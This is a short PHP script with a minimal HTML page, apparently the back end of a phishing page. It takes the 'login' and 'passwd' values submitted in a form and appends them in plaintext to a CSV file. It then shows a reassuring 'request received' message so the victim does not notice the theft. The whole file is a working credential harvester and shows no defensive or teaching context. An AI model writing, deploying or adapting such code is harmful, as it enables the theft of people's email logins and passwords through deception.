<?php

$email = $_POST['login'];
$password = $_POST['passwd'];
$data = $email . "," . $password;


$file = "file.csv";


file_put_contents($file, $data . PHP_EOL, FILE_APPEND);
print "<h1 align=center>Your request has been received and is being processed</h1>";


?>

<html>

<head>
  <title>Page</title>
</head>

<body>
  <h1><a href="index.html">GO BACK</a> </h1>
</body>




</html>